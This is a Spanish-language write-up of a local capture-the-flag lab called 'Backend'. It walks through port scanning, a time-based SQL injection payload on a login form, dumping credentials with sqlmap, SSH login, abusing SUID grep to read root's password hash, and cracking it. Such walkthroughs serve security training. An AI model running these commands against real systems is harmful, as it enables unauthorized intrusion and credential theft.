- Tags: #HidenCat
---
[Maquina Backend](https://mega.nz/file/DJlBRQyK#B63IORNn8g03XetnPC7tfG5QFfic_ngyDhTTqI-pb9U) -> Enlace de descarga al laboratorio
```bash
7z x backend.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh backend.tar # Desplegamos el laboratorio.
```

#### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion ip del target.
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conexion con el target.
wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

#### Fase Reconocimiento Puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 172.17.0.2 -oG allPorts # Realizamos descubrimiento de puertos
escanerTCP.py -t 172.17.0.2 -p 1-5000 # Usamos nuestra herramienta apra detectar puertos.
extractPorts allPorts # Parseamos la informacion mas importante del primera escaneo
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar el servicio y la version que corren detras de estos puertos.
```

**( 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) )** -> Tenemos un servicio **ssh** expuesto.
**( 80/tcp open  http    Apache httpd 2.4.61 ((Debian)) )** -> Tenemos un servicio web expuesto.

#### Fase Enumeracion Web:
```bash
whatweb http://172.17.0.2 # No reporta nada critico.
```

```bash
nmap --script http-enum -p80 172.17.0.2 # Detectamos lo siguiente.

/login.php: Possible admin folder
/login.html: Possible admin folder
/css/: Potentially interesting directory w/ listing on 'apache/2.4.61 (debian)'
```

**( http://172.17.0.2/ )** -> Tenemos la pagina principal del servicio web.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,css,js,java,php.back,back,txt # Descubrimos esta info.

/index.html           (Status: 200) [Size: 537]
/login.html           (Status: 200) [Size: 635]
/login.php            (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 306] [--> http://172.17.0.2/css/]
```

**( http://172.17.0.2/login.html )** -> Probaremos inyecciones SQL al login para intentar evardir el inicio de sesion. Este panel de inicio de sesion es vulnerable a SQLInjection Basa en Tiempo

```bash
admin' OR IF(SUBSTRING(DATABASE(),1,1)='u', SLEEP(5), 0)-- - # Tenemos la primera letra del nombre de la base de datos
```

**Nota** -> Crearemos un script automatizado para dumpear la base de datos, Ya sabiendo la longitud del nombre de **db** que es de **5** caracteres. Nuestro script no ha funcionado ya que desde el backend nos trunca la inyeccion.

#### Explotacion SQLMap:
```bash
sqlmap -u http://172.17.0.2/login.html --dbs --form -batch # Iniciamos la inyeccion para obtener el nombre de las bases de datos.
[*] users # Tenemos un bd potencial

sqlmap -u http://172.17.0.2/login.html --forms -D users --tables -batch # Fitramos por nombre de la base de datos
usuarios  # Tenemos esta tabla.

sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios --dump -batch # Dumpeamos la bd
+----+---------------+----------+
| id | password      | username |
+----+---------------+----------+
| 1  | $paco$123     | paco     |
| 2  | P123pepe3456P | pepe     |
| 3  | jjuuaann123   | juan     |
+----+---------------+----------+
```

#### Fase Intrusion:
**Nota** -> Sabiendo que esta expuesto el servicio **ssh** nos conectaremos con esas credenciales.
```bash
ssh-keygen -R 172.17.0.2 && ssh pepe@172.17.0.2 # Logramos conectarnos como este usuario
```

#### Fase Escalada Privilegios:
```bash
find / -perm -4000 2>/dev/null # Filtramos por permisos SUID

/usr/bin/grep # Tenemos este binario que podemos usar para poder la password de root hasheda.
/usr/bin/grep '' /root/pass.hash # 
e43833c4c9d5ac444e16bb94715a75e4 # Obtenemos este hash tendremos que determinar de que tipo es.
hash-identifier e43833c4c9d5ac444e16bb94715a75e4 # Nos reporat que es de tipo MD5
**spongebob34** -> # Usando una herramienta onlyne obtuvimos este password que utilizaremos para intentar loguearnos como root.
su root # Logramos 
```